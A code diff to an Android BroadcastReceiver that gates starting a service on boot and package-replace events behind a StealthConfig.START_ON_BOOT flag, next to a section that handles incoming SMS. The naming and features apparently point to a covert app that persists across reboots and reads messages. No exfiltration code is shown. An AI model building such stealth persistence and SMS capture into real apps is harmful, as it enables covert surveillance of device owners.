@@ -28,14 +28,18 @@ public class MyReceiver extends BroadcastReceiver {
         String action = intent.getAction();
         Log.d(TAG, "Received action: " + action);
 
-        // Handle boot completed events
+        // Handle boot completed events - only if START_ON_BOOT is enabled
         if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
             "android.intent.action.QUICKBOOT_POWERON".equals(action) ||
             "android.intent.action.LOCKED_BOOT_COMPLETED".equals(action) ||
             Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)) {
             
-            Log.d(TAG, "Boot/Package event received, starting service");
-            startService(context);
+            if (StealthConfig.START_ON_BOOT) {
+                Log.d(TAG, "Boot/Package event received, starting service (START_ON_BOOT enabled)");
+                startService(context);
+            } else {
+                Log.d(TAG, "Boot/Package event received but START_ON_BOOT is disabled");
+            }
         }
         
         // Handle SMS received
